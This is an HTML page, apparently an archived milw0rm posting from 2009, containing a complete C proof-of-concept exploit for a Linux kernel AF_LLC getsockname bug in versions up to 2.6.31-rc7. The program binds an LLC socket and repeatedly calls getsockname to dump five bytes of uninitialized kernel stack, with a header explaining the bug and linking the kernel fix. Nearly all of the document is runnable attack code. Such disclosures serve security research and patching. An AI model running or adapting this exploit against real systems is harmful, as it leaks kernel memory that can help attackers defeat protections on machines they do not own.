<html><head><title>Linux Kernel <= 2.6.31-rc7 AF_LLC getsockname 5-Byte Stack Disclosure</title></head><pre>/* 
 * llc-getsockname-leak.c
 *
 * Linux Kernel &lt;= 2.6.31-rc7 AF_LLC getsockname 5-Byte Stack Disclosure
 * Jon Oberheide &lt;jon@oberheide.org&gt;
 * http://jon.oberheide.org
 * 
 * Information:
 * 
 *   http://git.kernel.org/linus/28e9fc592cb8c7a43e4d3147b38be6032a0e81bc 
 *
 *   sllc_arphrd member of sockaddr_llc might not be changed. Zero sllc
 *   before copying to the above layer's structure.
 * 
 * Notes:
 * 
 *   Bug is present in &lt;= 2.6.31-rc7, but the impact is limited to &lt;= 2.6.24.4
 *   as AF_LLC sockets have been restricted to CAP_NET_RAW since then. Only 5 
 *   bytes of uninitialized kernel stack are leaked via AF_LLC's getsockname().
 */

#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;
#include &lt;unistd.h&gt;
#include &lt;time.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;net/if_arp.h&gt;

#ifndef AF_LLC
#define AF_LLC 26
#endif

#ifndef AF_LLC
#define AF_LLC 26
#endif

#ifndef LLC_SAP_NULL
#define LLC_SAP_NULL 0x00
#endif

#ifndef __LLC_SOCK_SIZE__
#define __LLC_SOCK_SIZE__ 16
struct sockaddr_llc {
	sa_family_t     sllc_family;
	sa_family_t     sllc_arphrd;
	unsigned char   sllc_test;
	unsigned char   sllc_xid;
	unsigned char   sllc_ua;
	unsigned char   sllc_sap;
	unsigned char   sllc_mac[6];
	unsigned char   __pad[__LLC_SOCK_SIZE__ - sizeof(sa_family_t) * 2 -
	                      sizeof(unsigned char) * 4 - 6];
};
#endif

const int randcalls[] = {
	__NR_read, __NR_write, __NR_open, __NR_close, __NR_stat, __NR_lstat,
	__NR_lseek, __NR_rt_sigaction, __NR_rt_sigprocmask, __NR_ioctl, 
	__NR_access, __NR_pipe, __NR_sched_yield, __NR_mremap, __NR_dup, 
	__NR_dup2, __NR_getitimer, __NR_setitimer, __NR_getpid, __NR_fcntl, 
	__NR_flock, __NR_getdents, __NR_getcwd, __NR_gettimeofday, 
	__NR_getrlimit, __NR_getuid, __NR_getgid, __NR_geteuid, __NR_getegid,
	__NR_getppid, __NR_getpgrp, __NR_getgroups, __NR_getresuid, 
	__NR_getresgid, __NR_getpgid, __NR_getsid,__NR_getpriority, 
	__NR_sched_getparam, __NR_sched_get_priority_max
};

void
dump(const unsigned char *p, unsigned l)
{
	printf(&quot;sockaddr_llc:&quot;);
	while (l &gt; 0) {
		printf(&quot; &quot;);
		if (l == 12 || l == 2) {
			printf(&quot;*** &quot;);
		}
		printf(&quot;%02x&quot;, *p);
		if (l == 10 || l == 1) {
			printf(&quot; ***&quot;);
		}
		++p; --l;
	}
	printf(&quot;\n&quot;);
}

int
main(void)
{
	struct sockaddr_llc sllc;
	int ret, sock, call, sllc_len = sizeof(sllc);
	
	printf(&quot;[+] Creating AF_LLC socket.\n&quot;);

	sock = socket(AF_LLC, SOCK_DGRAM, 0);
	if (sock == -1) {
		printf(&quot;[-] Error: Couldn't create AF_LLC socket.\n&quot;);
		printf(&quot;[-] %s.\n&quot;, strerror(errno));
		exit(1);
	}

	memset(&amp;sllc, 0, sllc_len);

	sllc.sllc_family = AF_LLC;
	sllc.sllc_arphrd = ARPHRD_ETHER;
	sllc.sllc_sap = LLC_SAP_NULL;
	
	printf(&quot;[+] Dummy sendto to autobind socket.\n&quot;);

	ret = sendto(sock, &quot;LEAK&quot;, 4, 0, (struct sockaddr *) &amp;sllc, sllc_len);
	if (ret == -1) {
		printf(&quot;[-] Error: sendto failed.\n&quot;);
		printf(&quot;[-] %s.\n&quot;, strerror(errno));
		exit(1);
	}

	printf(&quot;[+] Ready to call getsockname.\n\n&quot;);

	for (ret = 5; ret &gt; 0; ret--) {
		printf(&quot;%d...\n&quot;, ret);
		sleep(1);
	}
	srand(time(NULL));

	while (1) {
		/* random stuff to make stack pseudo-interesting */
		call = rand() % (sizeof(randcalls) / sizeof(int));
		syscall(randcalls[call]);

		ret = getsockname(sock, (struct sockaddr *) &amp;sllc, &amp;sllc_len);
		if (ret != 0) {
			printf(&quot;[-] Error: getsockname failed.\n&quot;);
			printf(&quot;[-] %s.\n&quot;, strerror(errno));
			exit(1);
		}

		dump((unsigned char *) &amp;sllc, sizeof(sllc));
	}

	return 0;
}

// milw0rm.com [2009-08-25]</pre></html>